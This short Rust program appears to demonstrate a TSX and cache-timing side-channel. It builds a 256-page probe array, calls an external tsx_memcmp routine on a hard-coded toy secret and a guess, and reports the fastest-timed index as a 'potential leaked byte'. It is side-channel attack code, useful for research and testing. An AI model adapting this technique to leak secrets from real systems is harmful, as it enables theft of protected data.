use memcopy::tsx_memcmp::tsx_memcmp;
use std::alloc;

fn main() {
    let layout = alloc::Layout::from_size_align(
        256 * 4096, 
        4096
    ).unwrap();
    let oracle = unsafe { alloc::alloc(layout) };
    
    let mut results = [0u64; 256];
    
    let secret = b"SECRET";
    
    let input = b"XECRET";
    
    unsafe {
        tsx_memcmp(
            secret.as_ptr(),
            input.as_ptr(),
            secret.len(),
            oracle,
            results.as_mut_ptr()
        );
    }
    
    let min_idx = results.iter().enumerate()
        .min_by_key(|(_, &t)| t)
        .map(|(i, _)| i)
        .unwrap();
    
    println!("Potential leaked byte: 0x{:02x}", min_idx);
}
